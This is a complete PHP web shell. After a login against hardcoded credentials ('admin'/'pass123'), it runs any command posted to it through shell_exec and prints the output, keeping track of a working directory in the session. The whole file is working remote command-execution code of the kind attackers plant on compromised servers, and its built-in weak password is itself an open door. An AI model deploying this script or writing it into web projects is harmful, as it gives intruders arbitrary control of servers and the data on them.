<?php

session_start();
global $home,$username, $password, $host;
$home = getcwd();
$username = "admin";
$password = "pass123";
$host = gethostname();
function run(){
	
	getdirectory();
executecommands();
	
	
	
	
}
function login(){
	global $username, $password;

	
	if(isauthorized()){
		
		
		run();
		
		
		
		
		
	}
	
	if(isset($_POST['username']) && ((isset($_POST['password'])))){
if(($_POST['username'] == $username) && (($_POST['password'] == $password)))
{
	
	$_SESSION['login'] = 'loggedin';
	











}
else
{
	
	echo "<pre id = 'output' class = 'login'>Login incorrect.</pre>";	
}}}
function isauthorized(){
	if(isset($_SESSION['login'])){
	if($_SESSION['login'] == 'loggedin'){
		
		return true;
		
	}
	
	else{
		
		return false;
		
	}
	
	
	
	
}}
function getdirectory(){
global $home,$username,$host;
if(isauthorized()){
if(isset($_POST['getdir'])){

if(isset($_SESSION["currentdir"]))
{

echo "[{$username}@{$host}  ".basename($_SESSION["currentdir"]);
}
else{
	
	echo "[{$username}@{$host}  ".basename($home);
	
}

}
}
}
function cd($cdcommand){
global $home;

if(count($cdcommand) == 2){
if($cdcommand[1][0] == "/"){
	
	chdir($cdcommand[1]);
	$_SESSION["currentdir"] = getcwd();
	
	
	
}
{
if(isset($_SESSION["currentdir"])){
if(is_dir($_SESSION["currentdir"]."/".$cdcommand[1]))
{
if(!chdir($_SESSION["currentdir"] ."/".$cdcommand[1]))
{
	throw new Exception("error");
	
	
	
}
else{
	
	$_SESSION["currentdir"] = getcwd();
}
}

}                                            
else if(!isset($_SESSION["currentdir"])){
	
	if(is_dir($home."/".$cdcommand[1]))
{
if(!chdir($home."/".$cdcommand[1])){
throw new Exception("error");
}
else{
	$_SESSION["currentdir"] = getcwd();
}
}

	
	
	
}

}}


else if(count($cdcommand) == 1){
	$_SESSION["currentdir"] = $home;
	
}}
function UserEnterCdCommand($command){
if(strpos($command, "cd") !== false){
	return true;
	
	
}

else{
	
	return false;
	
}	
	
	
	
}
function executecommands(){
if(isauthorized()){

if(isset($_POST['command'])){

$command = $_POST['command'];
if(UserEnterCdCommand($command)){
$cd = explode(" ",$command);
try{
cd($cd);
}
catch(Exception $e){
	echo $e->getMessage();
	
	
	
}
}

if(isset($_SESSION["currentdir"]))
{
chdir($_SESSION["currentdir"]);
}
echo "<pre id = 'output' class = 'text'>".htmlspecialchars(shell_exec($command))."</pre>";
}
}
}

login();

?>
